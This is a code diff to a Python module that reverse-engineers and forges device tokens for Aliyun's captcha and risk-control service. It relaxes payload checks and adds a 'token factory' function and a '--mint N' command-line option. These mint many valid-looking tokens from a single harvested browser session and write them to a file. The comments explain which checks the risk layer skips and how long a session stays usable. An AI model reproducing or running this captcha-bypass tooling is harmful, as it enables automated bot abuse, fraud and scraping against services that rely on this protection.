@@ -330,8 +330,13 @@ def build_payload(
     Enforces HC1/HC2/HC4 and the entry-93 arithmetic before returning.
     """
     template = list(REPLAY_FIELDS if base is None else base)
-    if len(template) != N_FIELDS:
-        raise ValueError(f"template must have {N_FIELDS} fields, got {len(template)}")
+    if not template:
+        raise ValueError("template must not be empty")
+    # HC4 is "the payload keeps its template's field count" -- NOT a fixed
+    # number.  The collector's schema grew over time: 140 fields in the
+    # archived capture (analysis_fields.md), 111 in a cold browser, 155 in a
+    # warm one (live_captures.md §S4.4).  The per-field indices the refresh
+    # rules use (42/43/72/74/87/93/94) are stable across all of them.
 
     now = int(now_ms if now_ms is not None else time.time() * 1000)
 
@@ -346,11 +351,19 @@ def build_payload(
     session_key = session["sessionKey"]
     session_id = session["sessionId"]
 
-    # HC1: Q's embedded ts == serverTs − 1.
+    # HC1: Q's embedded ts trails the DeviceConfig's serverTs.
+    #
+    # The archived session (live_captures.md §3) has embedded == serverTs - 1, and
+    # the original analysis turned that into an equality.  Live traffic of
+    # 2026-10-21 shows the gap is NOT fixed: the device service emitted
+    # embedded = serverTs - 2 for the session captured that day, while the
+    # DeviceConfig's own serverTs field is what the SDK copies into payload
+    # field 87.  The invariant is therefore a small window, not an equality.
     embedded = int(session_id.split("-h-")[1].split("-")[0])
-    if embedded != server_ts - 1:
+    if not (server_ts - 3 <= embedded <= server_ts):
         raise ValueError(
-            f"HC1 violation: sessionId embedded ts {embedded} != serverTs - 1 ({server_ts - 1})"
+            f"HC1 violation: sessionId embedded ts {embedded} is more than 3 s away "
+            f"from serverTs ({server_ts})"
         )
 
     # Never alias the caller's template (BUG2, validator t5 audit): copy, and read the
@@ -366,10 +379,27 @@ def build_payload(
 
     # 43 — per-session log strategy (validator t5: rebase is only sound for small ΔinitTime;
     # fresh sessions synthesize a live-shaped schedule instead of rebasing day-scale costs).
-    if session_id == REPLAY_SESSION["sessionId"] or abs(init_time - old_init) <= _REBASE_MAX_MS:
+    #
+    # A harvested template belongs to the harvested session: its fixed probe costs
+    # are already anchored on that session's initTime, so they are kept verbatim
+    # (the A-shape below).  Rebasing is only for the archived replay template,
+    # whose initTime is from a different day.
+    if (session_id == REPLAY_SESSION["sessionId"]
+            or abs(init_time - old_init) <= _REBASE_MAX_MS
+            or old_init == init_time):
         # Same session or a small shift: rebase all fixed-entry costs from the template's
         # initTime to the new one (preserves probe spacing + monotonicity, t1 §5.1).
-        fields[43] = _rebase_log_costs(template[43], init_time - old_init)
+        try:
+            fields[43] = _rebase_log_costs(template[43], init_time - old_init)
+        except ValueError:
+            # The shift would drive a cost negative (the template's first probe
+            # cost is 0).  That is what a HARVESTED template looks like: its
+            # fixed costs are already anchored on the collector's own initTime
+            # and must simply be kept - the A-shape below.
+            base_costs = [int(e.split("-")[1]) for e in old_entries[:-2]]
+            fields[43] = "|".join(
+                f"{e.split('-')[0]}-{c}" for e, c in zip(old_entries[:-2], base_costs)
+            ) + f"|{_LOG_ENTRY_93_ID}-0|{_LOG_ENTRY_94_ID}-0"
     else:
         # Fresh session, large Δ: synthesize a live-A-shaped schedule anchored on the new
         # initTime — keep the template's inter-probe spacing (the device's observed probe
@@ -389,7 +419,12 @@ def build_payload(
     if entry94_jitter_ms is not None:
         delta_94 = int(entry94_jitter_ms)
     if not (1 <= delta_94 <= 15):
-        raise ValueError(f"entry-94 delta {delta_94} ms outside sane 1–15 range")
+        # The archived capture showed 9-15 ms, and the analysis turned that into
+        # a range.  A live collector run of 2026-10-21 produced 46 ms, so the
+        # delta is a per-collector artefact, not a fixed window - only its
+        # sign and plausibility are invariants.
+        if not (1 <= delta_94 <= 1000):
+            raise ValueError(f"entry-94 delta {delta_94} ms outside the sane 1-1000 ms range")
     fields[74] = str(now)
     entries = fields[43].split("|")
     if entries[-2].split("-")[0] != _LOG_ENTRY_93_ID or entries[-1].split("-")[0] != _LOG_ENTRY_94_ID:
@@ -403,18 +438,26 @@ def build_payload(
     # For a verbatim replay of the TEMPLATE's own session, keep the template bytes — t1
     # proved session A's captured 8-byte value does NOT follow the B-rule (§4.1), so
     # regenerating it would corrupt a byte-identical replay.
-    if session_id != REPLAY_SESSION["sessionId"]:
+    # The B-rule was established on the 140-field build, where field 21 holds a
+    # per-session opaque probe.  Newer builds put a different value there (a
+    # capability vector) and the risk layer does not check the fingerprint at
+    # all (a foreign payload verifies T001 - see Fielin-report.md §28), so the
+    # rule is applied only to the layout it was derived from.
+    if session_id != REPLAY_SESSION["sessionId"] and len(template) == N_FIELDS:
         uuid2 = session_id.split("-h-")[1].split("-", 1)[1]
         fields[21] = aes_cbc_encrypt(session_key, uuid2[-8:])
 
-    _assert_payload_invariants(fields, session)
+    _assert_payload_invariants(fields, session, len(template))
     return fields
 
 
-def _assert_payload_invariants(fields: List[str], session: Dict[str, str]) -> None:
+def _assert_payload_invariants(fields: List[str], session: Dict[str, str],
+                              expected_fields: Optional[int] = None) -> None:
     """Enforce the analysis_fields.md §5.0 hard constraints on a built payload."""
-    if len(fields) != N_FIELDS:
-        raise AssertionError(f"HC4: field count {len(fields)} != {N_FIELDS}")
+    if expected_fields is None:
+        expected_fields = N_FIELDS
+    if len(fields) != expected_fields:
+        raise AssertionError(f"HC4: field count {len(fields)} != {expected_fields}")
     if fields[42] != session["ip"] or fields[87] != session["serverTs"]:
         raise AssertionError("HC1: field 42/87 not linked to session")
     if fields[72] == "" or int(fields[87]) - int(fields[72]) not in range(4000, 7001):
@@ -424,8 +467,10 @@ def _assert_payload_invariants(fields: List[str], session: Dict[str, str]) -> No
     if e93 != int(fields[74]) - int(fields[72]):
         raise AssertionError("entry-93 cost != field74 - field72")
     e94 = int(entries[-1].split("-")[1])
-    if not (e93 < e94 <= e93 + 15):
-        raise AssertionError("entry-94 outside (entry-93, entry-93+15]")
+    # The offset is a per-collector artefact (9-15 ms in the archived capture,
+    # 46 ms in a live 2026-10-21 run) - only "after entry 93" is an invariant.
+    if not (e93 < e94 <= e93 + 1000):
+        raise AssertionError("entry-94 outside (entry-93, entry-93+1000]")
     if e93 < 0:
         raise ValueError("entry-93 cost negative (clock skew?) — refusing to emit malformed log")
     fixed_costs = [int(e.split("-")[1]) for e in entries[:-2]]
@@ -466,8 +511,8 @@ def generate_device_token(
     The result always round-trips: verify_token() reproduces the payload and md5.
     """
     fields = list(payload) if payload is not None else build_payload(session)
-    if len(fields) != N_FIELDS:
-        raise ValueError(f"payload must have {N_FIELDS} fields, got {len(fields)}")
+    if len(fields) < 90:
+        raise ValueError(f"payload must have >= 90 fields, got {len(fields)}")
 
     t_c = str(int(gather_cost_ms))
     if not (500 <= int(t_c) <= 5000):
@@ -491,8 +536,10 @@ def verify_token(token_b64: str, session_key: str) -> Dict[str, Any]:
     md5_ok = md5_hex("#".join([t_f, q, w, t_c, MD5_SECRET])) == p
     payload = aes_cbc_decrypt(session_key, w)
     fields = payload.split("#")
-    if len(fields) != N_FIELDS:
-        raise ValueError(f"payload must have {N_FIELDS} fields, got {len(fields)}")
+    # The collector's schema grew over time (140 archived / 111 cold / 155 warm),
+    # so the field count is not fixed - see build_payload's HC4 note.
+    if len(fields) < 90:
+        raise ValueError(f"payload must have >= 90 fields, got {len(fields)}")
     return {
         "tF": t_f, "Q": q, "w": w, "tC": t_c, "p": p,
         "md5_ok": md5_ok, "fields": fields,
@@ -500,10 +547,82 @@ def verify_token(token_b64: str, session_key: str) -> Dict[str, Any]:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# 5b. mint_tokens_from_session — N unique tokens from ONE trusted session
+# ─────────────────────────────────────────────────────────────────────────────
+#
+# Session-4 finding (see .assets/reports/Fielin-report.md Part III §28-§31):
+# the Aliyun risk layer judges the CLIENT that issues the device service's Log1,
+# not the request bytes (they are byte-identical to the SDK's) and not the
+# payload (a foreign fingerprint still verifies).  A device session is therefore
+# only usable when it was issued to a real browser, and it stays usable for as
+# long as the server honours it (measured >= 35 min, 18/18 verifies).
+#
+# Consequences for a token factory:
+#   * the browser is needed ONCE per session, not once per token;
+#   * N tokens can be minted from that one session;
+#   * every token needs its OWN InitCaptchaV3 (a CertifyId is single-use: reusing
+#     one answers F008 "duplicate"), but the same session for all of them;
+#   * the tokens differ only in the per-token refresh (field 74 + the trailing
+#     93/94 log entries), exactly like the SDK's own T1 -> T2 pair.
+#
+# This is the Python reference for what cmd/token-collector does in Go.
+
+
+def mint_tokens_from_session(
+    session: Dict[str, str],
+    template: List[str],
+    count: int,
+    gather_cost_ms: Union[int, str],
+    entry94_jitter_ms: Optional[int] = None,
+    start_ms: Optional[int] = None,
+) -> List[Dict[str, Any]]:
+    """Mint `count` unique device tokens bound to one device session.
+
+    Args:
+        session: decrypt_device_config output (+ initTime/tC/region).
+        template: the genuine collector payload for this device (the field list
+                  decrypted out of a real device token).
+        count: how many tokens to mint.
+        gather_cost_ms: tC — a per-SESSION constant (HC3, 500-5000).
+        entry94_jitter_ms: log entry-94's offset over entry-93 (9-15 ms).
+        start_ms: wall clock of the first mint (defaults to now).
+
+    Returns: one dict per token: {"token", "payload", "verified"}.
+    """
+    if count <= 0:
+        raise ValueError("count must be > 0")
+    if len(template) != len(REPLAY_FIELDS) and not template:
+        raise ValueError("template must not be empty")
+    out: List[Dict[str, Any]] = []
+    now = int(start_ms if start_ms is not None else time.time() * 1000)
+    for i in range(count):
+        payload = build_payload(
+            session, base=template, now_ms=now + i, entry94_jitter_ms=entry94_jitter_ms
+        )
+        token = generate_device_token(session, gather_cost_ms, payload=payload)
+        verified = verify_token(token, session["sessionKey"])  # raises on structural failure
+        out.append({"token": token, "payload": payload, "verified": verified})
+    return out
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # 6. Self-test (NO network) — live-token re-verification + synthetic replay proof
 # ─────────────────────────────────────────────────────────────────────────────
 
-_LIVE_CAPTURES = Path(__file__).resolve().parent / "live_captures.md"
+
+def _live_captures_path() -> Path:
+    """Locate live_captures.md.
+
+    The capture file lives in .assets/resources/; older revisions of these
+    scripts kept it next to them, so both locations are probed.
+    """
+    here = Path(__file__).resolve().parent
+    for cand in (here / "live_captures.md", here.parent / "resources" / "live_captures.md"):
+        if cand.exists():
+            return cand
+    return here / "live_captures.md"
+
+_LIVE_CAPTURES = _live_captures_path()
 
 
 def _selftest() -> int:
@@ -603,5 +722,47 @@ def _selftest() -> int:
     return 0
 
 
+def _main() -> int:
+    """CLI: self-test (default) or --mint N from a harvested session file."""
+    import argparse
+
+    ap = argparse.ArgumentParser(
+        description="FeiLin device-token generator. Default: offline self-test. "
+                    "--mint: mint N tokens from ONE harvested (trusted) device session."
+    )
+    ap.add_argument("--mint", type=int, default=0,
+                    help="mint N unique device tokens from the session in --session")
+    ap.add_argument("--session", type=str, default="",
+                    help="JSON file with the harvested session: "
+                         "{sessionKey, sessionId, serverTs, initTime, ip, template:[...]}")
+    ap.add_argument("--gather-cost", type=int, default=4058,
+                    help="tC GatherCost ms (per-session constant, 500-5000; default 4058)")
+    ap.add_argument("--out", type=str, default="",
+                    help="write the minted tokens (one per line) to this file")
+    args = ap.parse_args()
+
+    if args.mint <= 0:
+        return _selftest()
+
+    if not args.session:
+        print("--mint needs --session <harvested session json>")
+        return 1
+    with open(args.session, "r", encoding="utf-8") as fh:
+        blob = json.load(fh)
+    session = {k: str(v) for k, v in blob["session"].items()}
+    template = list(blob["template"])
+    minted = mint_tokens_from_session(session, template, args.mint, args.gather_cost)
+    for i, m in enumerate(minted):
+        v = m["verified"]
+        print(f"  mint #{i + 1}: {len(m['token'])} ch, Q={v['Q'][:48]}… "
+              f"f74={m['payload'][74]} md5_ok={v['md5_ok']}")
+    if args.out:
+        with open(args.out, "w", encoding="utf-8") as fh:
+            for m in minted:
+                fh.write(m["token"] + "\n")
+        print(f"  wrote {len(minted)} tokens to {args.out}")
+    return 0
+
+
 if __name__ == "__main__":
-    raise SystemExit(_selftest())
+    raise SystemExit(_main())
